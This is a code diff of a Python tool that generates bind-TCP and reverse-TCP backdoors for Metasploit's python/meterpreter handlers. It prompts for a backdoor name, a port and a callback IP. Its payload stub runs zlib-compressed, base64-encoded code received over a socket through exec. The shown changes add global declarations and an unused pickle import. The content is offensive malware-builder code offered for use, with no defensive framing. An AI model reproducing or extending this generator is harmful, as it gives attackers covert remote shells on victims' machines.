@@ -1,4 +1,5 @@
 import os
+from pickle import GLOBAL
 logo = """
 
 ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
@@ -53,6 +54,7 @@ clear = lambda: os.system('cls')
 clear()
 print(logo)
 def gen_bind():
+    global name
     name = input('Please enter the name you wish to give your backdoor (do NOT add extention such as .py or .exe): ')
     port = input('Please enter the port number you wish the backdoor to listen on (recomended between 1024-65353): ')
     with open(name, 'a+') as ina:
@@ -74,7 +76,7 @@ exec(zlib.decompress(base64.b64decode(d)),{'s':s})
         print('(*) Generated Backdoor and saved as '+name)
         print('After deployment interact with this Backdoor through this module in metasploit python/meterpreter/bind_tcp')
 def gen_rev():
-
+    global name
     name = input('Please enter the name you wish to give your backdoor (do NOT add extention such as .py or .exe): ')
     port = input('Please enter the port number you wish the backdoor to listen on (recomended between 1024-65353): ')
     host = input('Please enter the ip you wish the backdoor to connect back to: ')
